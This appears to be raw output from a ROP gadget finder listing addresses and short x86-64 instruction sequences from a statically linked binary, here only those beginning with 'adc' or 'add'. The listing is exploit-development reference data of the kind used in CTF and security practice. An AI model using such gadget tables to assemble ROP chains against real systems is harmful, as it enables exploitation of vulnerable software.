Gadgets information
============================================================
0x0000000000407407 : adc ah, al ; out 0x2c, al ; inc byte ptr [rcx + 9] ; ret
0x000000000044405f : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004440c9 : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000493d1d : adc al, 0 ; add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x00000000004344a5 : adc al, 0x13 ; jmp rdx
0x000000000042c765 : adc al, 0x16 ; sub eax, edx ; ret
0x0000000000493a3a : adc al, 0x24 ; mov edi, 1 ; call rax
0x0000000000415231 : adc al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x000000000044b430 : adc al, 0x48 ; lea eax, dword ptr [rdi + 0x14] ; ret
0x00000000004b6d0c : adc al, 0x89 ; clc ; jmp qword ptr [rsi]
0x00000000004789e8 : adc al, 0x90 ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00000000004454f0 : adc al, 0x91 ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x0000000000443c1e : adc al, 0x91 ; sub eax, edx ; ret
0x00000000004344a1 : adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x0000000000413be0 : adc al, 0x97 ; add rdx, rdi ; jmp rdx
0x000000000042b367 : adc al, 0xa ; jmp r10
0x000000000042c8d3 : adc al, 0xa ; sub eax, edx ; ret
0x0000000000473008 : adc al, 0xbd ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000044d9af : adc al, 0xe ; cmp rdi, rdx ; jb 0x44d9c2 ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000430d4a : adc al, 0xe ; sub eax, edx ; ret
0x0000000000432a1a : adc al, 0xe ; sub eax, edx ; vzeroupper ; ret
0x00000000004193db : adc al, 0xf6 ; ret 0x7420
0x0000000000493dbd : adc al, 0xf7 ; ret
0x00000000004b8729 : adc al, 0xfa ; call qword ptr [rdi]
0x000000000042af86 : adc al, 1 ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000444207 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444271 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000040799a : adc al, byte ptr [rdx] ; add byte ptr [rax], al ; call qword ptr [rbx + 0x10]
0x000000000042b2ca : adc bh, byte ptr [rbx + 0xf480001] ; ret 0x66c3
0x00000000004478f5 : adc bl, ch ; call 0xffffffffc415024a
0x0000000000447815 : adc bl, ch ; call 0xffffffffc43d016a
0x000000000049c29c : adc bl, ch ; cli ; jmp qword ptr [rax]
0x0000000000489942 : adc bl, ch ; jno 0x489998 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000044ad66 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000044add7 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x000000000044ad37 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000403a7b : adc bl, dh ; ret
0x000000000044ad65 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000485dda : adc byte ptr [r11 + 0x5d], bl ; pop r12 ; ret
0x000000000041fc65 : adc byte ptr [r11 + 0x5d], r11b ; ret
0x0000000000486328 : adc byte ptr [r11 + rcx*4 + 0xd], r9b ; jmp rbx
0x000000000048a3ae : adc byte ptr [r15], cl ; sahf ; ret 0x3948
0x0000000000462be9 : adc byte ptr [r15], cl ; sahf ; ret 0x894c
0x000000000048abc3 : adc byte ptr [r15], cl ; xchg eax, ebx ; ret 0x3949
0x0000000000461e05 : adc byte ptr [r15], r9b ; xchg eax, ebx ; ret 0x3948
0x00000000004625e6 : adc byte ptr [r15], r9b ; xchg eax, ebx ; ret 0x3949
0x000000000048889f : adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x0000000000418062 : adc byte ptr [r8 + 1], r9b ; ret
0x000000000041f24f : adc byte ptr [r8 - 0x77], r9b ; ret 0xf8b
0x0000000000482edf : adc byte ptr [r8 - 0x7d], cl ; ret
0x000000000041808d : adc byte ptr [r9 + 0x2b], r9b ; or byte ptr [r8 + 0x29], r9b ; ret
0x000000000048abbd : adc byte ptr [rax + 0x39], cl ; ret
0x00000000004254d3 : adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x000000000042180c : adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x0000000000421b88 : adc byte ptr [rax + 0x39], cl ; ret 0xb277
0x000000000042a4c6 : adc byte ptr [rax + 0x39], cl ; ret 0xf475
0x00000000004bca0c : adc byte ptr [rax + 0x4d100000], ah ; std ; call qword ptr [rdx]
0x00000000004888a0 : adc byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x0000000000419ade : adc byte ptr [rax + 0xf], cl ; ret 0x8948
0x0000000000418063 : adc byte ptr [rax + 1], cl ; ret
0x0000000000417467 : adc byte ptr [rax + 1], cl ; ret 0x2b48
0x00000000004077ce : adc byte ptr [rax - 0x39], cl ; ret 0
0x000000000047c655 : adc byte ptr [rax - 0x73], cl ; or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000048f8bf : adc byte ptr [rax - 0x75], cl ; cmp cl, byte ptr [rax - 0x7d] ; ret 0xf08
0x000000000042346d : adc byte ptr [rax - 0x77], cl ; and al, 8 ; call rcx
0x0000000000452c05 : adc byte ptr [rax - 0x77], cl ; and sil, al ; sub byte ptr [rcx], al ; ret
0x000000000045f508 : adc byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000477677 : adc byte ptr [rax - 0x77], cl ; jo 0x477695 ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000477637 : adc byte ptr [rax - 0x77], cl ; push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x000000000047763b : adc byte ptr [rax - 0x77], cl ; ret
0x0000000000428c7f : adc byte ptr [rax - 0x77], cl ; ret 0x8d48
0x0000000000424841 : adc byte ptr [rax - 0x77], cl ; ret 0x8d4c
0x000000000041f250 : adc byte ptr [rax - 0x77], cl ; ret 0xf8b
0x000000000041da2f : adc byte ptr [rax - 0x78], al ; jl 0x41da51 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000417eb3 : adc byte ptr [rax - 0x7b], cl ; push qword ptr [rsp + rcx - 0x18] ; ret 0xec
0x0000000000447ad7 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x0000000000447b13 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00000000004079a0 : adc byte ptr [rax - 0x7d], cl ; ret
0x0000000000420303 : adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000401167 : adc byte ptr [rax - 0x7d], cl ; ret 0x4808
0x000000000045c1e8 : adc byte ptr [rax - 0x7d], cl ; ret 0x4902
0x0000000000445abc : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444411 : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044ec8c : adc byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004b4160 : adc byte ptr [rax], al ; add byte ptr [rax], al ; push -0x67ffffe9 ; ret
0x00000000004b920c : adc byte ptr [rax], ch ; add byte ptr [rax], dh ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rbx]
0x0000000000494ce8 : adc byte ptr [rbp + 0x13], dh ; xor eax, eax ; ret
0x0000000000491b48 : adc byte ptr [rbp + 0x1d], dh ; xor eax, eax ; ret
0x0000000000406f87 : adc byte ptr [rbp + 9], al ; fadd qword ptr [rcx - 0x77] ; ret
0x00000000004bca10 : adc byte ptr [rbp - 3], cl ; call qword ptr [rdx]
0x000000000049d160 : adc byte ptr [rbp - 5], ah ; push rax ; sti ; call rax
0x00000000004b8f0c : adc byte ptr [rbp], ah ; add al, dl ; mov dl, bh ; call qword ptr [rcx]
0x000000000041a714 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004172d3 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041fc66 : adc byte ptr [rbx + 0x5d], bl ; ret
0x00000000004bb1e7 : adc byte ptr [rbx + 0x80e5802], al ; ret
0x0000000000486329 : adc byte ptr [rbx + rcx*4 + 0xd], cl ; jmp rbx
0x0000000000452c13 : adc byte ptr [rbx - 0x16], dh ; ret
0x0000000000452c12 : adc byte ptr [rbx - 0x16], sil ; ret
0x000000000041ee32 : adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000477b6e : adc byte ptr [rbx - 0x3b7cb7fa], cl ; or byte ptr [rbx + 0x5d], bl ; ret
0x000000000049b424 : adc byte ptr [rbx - 0x4aef0007], dh ; stc ; call qword ptr [rax]
0x000000000041808e : adc byte ptr [rcx + 0x2b], cl ; or byte ptr [r8 + 0x29], r9b ; ret
0x0000000000406cfb : adc byte ptr [rcx + 0x31], al ; ret
0x0000000000478c73 : adc byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x000000000049b394 : adc byte ptr [rcx + rdi*8 - 0x6520f01], ch ; call rax
0x0000000000451a32 : adc byte ptr [rcx - 0x75], cl ; add al, byte ptr [rbx + 0x94801e0] ; ret 0x8949
0x000000000049174f : adc byte ptr [rcx - 0x77], cl ; ret
0x000000000041fbb7 : adc byte ptr [rcx - 0x7d], al ; ret
0x0000000000462b81 : adc byte ptr [rcx - 0x7d], cl ; ret
0x0000000000430ddd : adc byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00000000004891fa : adc byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000044f5e9 : adc byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000049b18c : adc byte ptr [rcx], bl ; stc ; jmp qword ptr [rax]
0x000000000041ee35 : adc byte ptr [rcx], ch ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x00000000004189d7 : adc byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x0000000000429f5d : adc byte ptr [rdi], al ; add byte ptr [rax + 0x31], dl ; shr al, 0xb8 ; ret
0x000000000048a3af : adc byte ptr [rdi], cl ; sahf ; ret 0x3948
0x0000000000462bea : adc byte ptr [rdi], cl ; sahf ; ret 0x894c
0x000000000044b643 : adc byte ptr [rdi], cl ; test esi, edx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x00000000004311c1 : adc byte ptr [rdi], cl ; xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004312b1 : adc byte ptr [rdi], cl ; xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004310d1 : adc byte ptr [rdi], cl ; xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000431b19 : adc byte ptr [rdi], cl ; xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x0000000000431671 : adc byte ptr [rdi], cl ; xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x0000000000430e01 : adc byte ptr [rdi], cl ; xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x0000000000431851 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000430fe1 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x0000000000431a31 : adc byte ptr [rdi], cl ; xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000431941 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000431283 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000431373 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000431193 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430ef1 : adc byte ptr [rdi], cl ; xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x00000000004310a3 : adc byte ptr [rdi], cl ; xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430ec3 : adc byte ptr [rdi], cl ; xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430fb3 : adc byte ptr [rdi], cl ; xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430dd3 : adc byte ptr [rdi], cl ; xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x0000000000461e06 : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3948
0x00000000004625e7 : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3949
0x00000000004509b9 : adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x2044
0x000000000048aa71 : adc byte ptr [rdi], r9b ; sahf ; ret 0x3948
0x0000000000489dad : adc byte ptr [rdi], r9b ; xchg eax, ebx ; ret 0x3948
0x00000000004b484b : adc byte ptr [rdx + 0xe], al ; or byte ptr [rax + 0xb], cl ; add dh, byte ptr [rbx + 0xa] ; ret
0x0000000000434999 : adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000049b4a4 : adc byte ptr [rdx - 0x4bef0007], dh ; stc ; call qword ptr [rax]
0x00000000004338db : adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043378a : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret
0x0000000000432d85 : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042b4b5 : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000043f9db : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x000000000049b50c : adc byte ptr [rsi - 0x6eaf0007], ah ; stc ; jmp qword ptr [rax]
0x000000000042aeaa : adc ch, byte ptr [rbp] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000049b618 : adc ch, dl ; stc ; push rax ; salc ; stc ; call rax
0x000000000049b600 : adc cl, bl ; stc ; jmp rax
0x00000000004640cf : adc cl, byte ptr [rax - 0x75] ; adc cl, byte ptr [rbx + rcx*4 + 0x6c] ; ret 0x4c40
0x00000000004531ca : adc cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x0000000000447805 : adc cl, byte ptr [rax - 1] ; ret 0x2288
0x00000000004640d2 : adc cl, byte ptr [rbx + rcx*4 + 0x6c] ; ret 0x4c40
0x000000000048ca9a : adc cl, byte ptr [rcx + 0x48b48d8] ; ret 0x8b48
0x0000000000462ea5 : adc cl, byte ptr [rcx - 0x7d] ; ret
0x0000000000422ebe : adc dh, dh ; ret 0xf0f
0x000000000049b67c : adc dh, dl ; stc ; inc dword ptr [rax] ; fdivr st(1) ; call rax
0x00000000004961b4 : adc dl, ah ; and al, byte ptr [rax] ; test eax, eax ; je 0x4961c9 ; ret
0x000000000049c260 : adc dl, ch ; cli ; jmp qword ptr [rax]
0x000000000049b5b0 : adc dl, dl ; stc ; call rax
0x0000000000476beb : adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x00000000004617ad : adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x000000000041807f : adc dword ptr [rax - 0x3f], ecx ; cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000040bacf : adc dword ptr [rax - 0x7d], ecx ; ret
0x0000000000478204 : adc dword ptr [rax - 0x7d], ecx ; ret 0x4110
0x0000000000445abb : adc dword ptr [rax], 0x83480000 ; ret 0x4910
0x00000000004443a7 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004459bf : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000461e15 : adc dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; call qword ptr [rbx]
0x000000000047eebb : adc dword ptr [rbp + 0x24], ebx ; add byte ptr [rax + 0x39], cl ; ret 0xf48
0x000000000044dc08 : adc dword ptr [rbx], eax ; ret
0x000000000044db81 : adc dword ptr [rbx], esp ; ret
0x000000000043f307 : adc dword ptr [rcx + 7], edi ; ret
0x000000000044db7c : adc dword ptr [rcx - 0x30], eax ; movups xmmword ptr [r11], xmm4 ; ret
0x0000000000406ce4 : adc dword ptr [rcx - 0x77], eax ; ret
0x0000000000490406 : adc dword ptr [rcx - 0x7d], ecx ; ret
0x000000000043efa2 : adc dword ptr [rcx - 1], ebx ; ret
0x000000000043ef66 : adc dword ptr [rcx - 1], edi ; ret
0x0000000000475fee : adc dword ptr [rcx], eax ; clc ; mov rdx, r8 ; jmp 0x475fc4
0x000000000044dc03 : adc dword ptr [rdi + 0x30], edi ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000044d963 : adc dword ptr [rdi + rdx - 0x10], ecx ; ret
0x000000000044dae5 : adc dword ptr [rdi + rdx - 0x10], edx ; movups xmmword ptr [rdi + rdx - 0x20], xmm3 ; ret
0x000000000044daea : adc dword ptr [rdi + rdx - 0x20], ebx ; ret
0x000000000044dac2 : adc dword ptr [rdi + rdx - 0x30], esi ; movups xmmword ptr [rdi + rdx - 0x40], xmm7 ; ret
0x000000000044dac7 : adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x000000000043f469 : adc dword ptr [rdi - 8], edi ; ret
0x000000000044d960 : adc dword ptr [rdi], eax ; movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044d75c : adc dword ptr [rdi], edx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x000000000044d88f : adc dword ptr [rsi + 3], edx ; ret
0x000000000044d92c : adc dword ptr [rsi + 7], edx ; ret
0x000000000044d72e : adc dword ptr [rsi - 1], edx ; ret
0x00000000004919c6 : adc dword ptr [rsp - 0x28], eax ; ret
0x00000000004443a6 : adc dword ptr es:[rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042af84 : adc eax, 0x11407 ; cmovne rax, rdx ; ret
0x000000000042a2d0 : adc eax, 0x1d62b ; cmovne rax, rdx ; ret
0x000000000042b160 : adc eax, 0x1df4b ; cmovne rax, rdx ; ret
0x000000000042aef5 : adc eax, 0x209c6 ; cmovne rax, rdx ; ret
0x000000000042a269 : adc eax, 0x21332 ; cmovne rax, rdx ; ret
0x0000000000461789 : adc eax, 0x26132a ; je 0x4617a0 ; ret
0x0000000000453fe7 : adc eax, 0x26cacc ; pop rbx ; ret
0x000000000042a2a0 : adc eax, 0x272b ; cmovne rax, rdx ; ret
0x000000000041fb54 : adc eax, 0x2a1cd7 ; ret
0x000000000047af8b : adc eax, 0x30 ; cmovne rax, rdx ; ret
0x00000000004827b2 : adc eax, 0x4000003 ; ret
0x0000000000482702 : adc eax, 0x4000003 ; xor eax, eax ; ret
0x000000000042a3aa : adc eax, 0x50d1 ; cmovne rax, rdx ; ret
0x0000000000443f31 : adc eax, 0x83480000 ; ret 0xe910
0x0000000000470265 : adc eax, 0x83fffffd ; ret
0x000000000047f8b1 : adc eax, 0x89000003 ; ret 0xe8c0
0x000000000047b45a : adc eax, 0xe180d188 ; pcmpeqb mm3, qword ptr [rsi] ; ret
0x000000000042b224 : adc eax, 0xe697 ; cmovne rax, rdx ; ret
0x000000000042b0e4 : adc eax, 0xe7b7 ; cmovne rax, rdx ; ret
0x000000000044e7b4 : adc eax, 0xf880272 ; ret
0x000000000047a8c5 : adc eax, 0xfffd4096 ; cmove rax, rdx ; ret
0x000000000044581e : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042a26b : adc eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000048af29 : adc eax, eax ; ret
0x000000000048b066 : adc eax, edx ; pop rbp ; pop rbx ; ret
0x00000000004aeb65 : adc ebp, dword ptr [rbx] ; fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x0000000000419707 : adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000045914b : adc ebx, esi ; cli ; inc dword ptr [rcx - 0x77] ; ret
0x000000000047c65c : adc ebx, esi ; ret
0x000000000041dc4a : adc ecx, dword ptr [rax - 0x7b] ; push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x00000000004153f1 : adc ecx, dword ptr [rax - 0x7d] ; ret
0x000000000045e4d4 : adc ecx, dword ptr [rcx + 0x29d231fb] ; ret
0x000000000046fa56 : adc ecx, dword ptr [rcx + rax - 0x1e] ; call qword ptr [r10 + rax*8]
0x0000000000485c7e : adc edi, dword ptr [rcx] ; ret 0x840f
0x0000000000485d1b : adc edi, dword ptr [rcx] ; ret 0xc74
0x00000000004b007e : adc esi, dword ptr [rbp - 0x60001a67] ; mov dh, 0xc7 ; ret 0xe71f
0x000000000041d013 : adc esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x0000000000494b5c : adc esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00000000004193d9 : adc esi, dword ptr [rsp + rdx - 0xa] ; ret 0x7420
0x000000000046178b : adc esp, dword ptr [rsi] ; add byte ptr [rax + rcx - 0xd], dh ; ret
0x000000000043f306 : adc qword ptr [rcx + 7], rdi ; ret
0x000000000043efa1 : adc qword ptr [rcx - 1], rbx ; ret
0x000000000043ef65 : adc qword ptr [rcx - 1], rdi ; ret
0x000000000043f468 : adc qword ptr [rdi - 8], rdi ; ret
0x000000000044d88e : adc qword ptr [rsi + 3], rdx ; ret
0x000000000044d92b : adc qword ptr [rsi + 7], rdx ; ret
0x000000000044d72d : adc qword ptr [rsi - 1], rdx ; ret
0x000000000048b065 : adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00000000004bc6bb : add ah, ah ; sub ch, bh ; jmp qword ptr [rdx]
0x00000000004b8c2b : add ah, al ; cli ; jmp rax
0x000000000044ebde : add ah, bh ; add eax, dword ptr [rax] ; pop rbx ; ret
0x000000000044ecbb : add ah, bh ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000044ec29 : add ah, bh ; inc dword ptr [rbx] ; pop rbx ; ret
0x00000000004b8f23 : add ah, bl ; mov dl, bh ; call qword ptr [rcx]
0x00000000004b33d7 : add ah, bl ; or dword ptr [rax], eax ; add byte ptr [rsi + rax*4], al ; cmc ; call rsp
0x000000000044d88a : add ah, byte ptr [rdx - 0xf] ; jl 0x44d8df ; adc dword ptr [rsi + 3], edx ; ret
0x00000000004ba0f2 : add ah, byte ptr [rsi + rcx + 8] ; ret
0x000000000049c2bc : add ah, ch ; cli ; jmp qword ptr [rax]
0x00000000004b7103 : add ah, ch ; jne 0x4b7104 ; jmp rbx
0x00000000004b70b3 : add ah, cl ; jne 0x4b70b4 ; call qword ptr [rdx]
0x00000000004b8693 : add ah, cl ; or bh, dl ; call rcx
0x00000000004b84c7 : add ah, cl ; pop rdx ; add byte ptr [rax], al ; je 0x4b84cd ; stc ; jmp qword ptr [rdx]
0x00000000004b703b : add ah, dh ; insb byte ptr [rdi], dx ; stc ; call rsp
0x0000000000400a99 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000459e13 : add al, 0 ; add bh, dh ; ret 0
0x0000000000459e07 : add al, 0 ; add bh, dh ; ret 0xf800
0x000000000045db0f : add al, 0 ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x0000000000417c00 : add al, 0 ; add byte ptr [rax + 1], cl ; ret
0x0000000000431737 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000475f06 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x00000000004466df : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431765 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000494c80 : add al, 0 ; add byte ptr [rax], al ; jne 0x494ca7 ; ret
0x000000000047b4e3 : add al, 0 ; add byte ptr [rax], al ; ret
0x0000000000479200 : add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000410991 : add al, 0 ; add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x0000000000411594 : add al, 0 ; add byte ptr [rbx - 0x7bf0fc08], al ; ret
0x0000000000410850 : add al, 0 ; add byte ptr [rbx - 0x7bf0fe08], al ; ret 4
0x000000000042aed5 : add al, 0 ; add byte ptr [rsi - 9], dh ; ret 0
0x000000000040a935 : add al, 0 ; mov rdi, r12 ; call 0x426b87
0x000000000040a934 : add al, 0 ; mov rdi, r12 ; call 0x426b88
0x000000000040a933 : add al, 0 ; mov rdi, r12 ; call 0x426b89
0x000000000044fd01 : add al, 0 ; movsxd rax, dword ptr [rdx + rbx*4] ; add rax, rdx ; jmp rax
0x000000000044eb85 : add al, 0 ; movsxd rax, dword ptr [rsi + rdi*4] ; add rax, rsi ; jmp rax
0x000000000047c65b : add al, 0x11 ; ret
0x000000000044ec74 : add al, 0x12 ; pop rbx ; and eax, 0x7ff80000 ; ret
0x000000000042c761 : add al, 0x17 ; movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x000000000042c6fa : add al, 0x17 ; sub eax, ecx ; ret
0x00000000004058e0 : add al, 0x24 ; add esp, eax ; ret
0x000000000048d890 : add al, 0x24 ; add rax, qword ptr [rdx + 8] ; call rax
0x00000000004918c7 : add al, 0x24 ; add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x00000000004915cb : add al, 0x24 ; add rsp, 0x38 ; ret
0x00000000004907c4 : add al, 0x24 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x00000000004617ea : add al, 0x25 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000048ae7b : add al, 0x25 ; sub byte ptr [rax], al ; add byte ptr [rax], al ; jne 0x48aec7 ; leave ; ret
0x00000000004152f7 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x000000000047a02e : add al, 0x31 ; ret
0x0000000000479f2a : add al, 0x37 ; ret
0x000000000041e4cf : add al, 0x3a ; ret
0x00000000004b7100 : add al, 0x47 ; add byte ptr [rax], al ; in al, dx ; jne 0x4b7107 ; jmp rbx
0x0000000000486556 : add al, 0x48 ; cmp ecx, dword ptr [rdi + rsi] ; jae 0x48650a ; xor eax, eax ; ret
0x000000000044b29b : add al, 0x48 ; lea eax, dword ptr [rdi + 5] ; ret
0x000000000044a7a9 : add al, 0x48 ; lea eax, dword ptr [rdx + 4] ; ret
0x000000000044a7bb : add al, 0x48 ; lea eax, dword ptr [rdx + 5] ; ret
0x0000000000493dd0 : add al, 0x48 ; mov dword ptr [rax], edx ; ret
0x000000000043beaa : add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x0000000000448fe9 : add al, 0x48 ; mov eax, edi ; ret
0x000000000047a304 : add al, 0x48 ; xor eax, eax ; ret
0x00000000004852e6 : add al, 0x4c ; cmp ecx, eax ; jne 0x485294 ; mov eax, dword ptr [rdx + 4] ; ret
0x000000000047abc8 : add al, 0x4c ; lea ecx, dword ptr [rsp + 0x20] ; call rbx
0x000000000045d14a : add al, 0x4d ; cmp ebp, ebx ; jb 0x45d1c0 ; mov rdx, rax ; jmp 0x45d117
0x00000000004b7900 : add al, 0x4f ; add byte ptr [rax], al ; pop rsp ; cdq ; stc ; call rsi
0x000000000044a7b7 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; lea rax, qword ptr [rdx + 5] ; ret
0x0000000000448ff7 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x000000000045e4d2 : add al, 0x72 ; adc ecx, dword ptr [rcx + 0x29d231fb] ; ret
0x00000000004756e8 : add al, 0x81 ; add rax, rcx ; jmp rax
0x0000000000443c1b : add al, 0x81 ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00000000004454f3 : add al, 0x81 ; sub eax, edx ; ret
0x00000000004088b7 : add al, 0x82 ; add rax, rdx ; jmp rax
0x000000000044f1b8 : add al, 0x82 ; sub eax, dword ptr [rdx + rcx*4] ; je 0x44f1a8 ; ret
0x0000000000441827 : add al, 0x82 ; sub eax, ecx ; ret
0x00000000004540b9 : add al, 0x83 ; add rax, rbx ; jmp rax
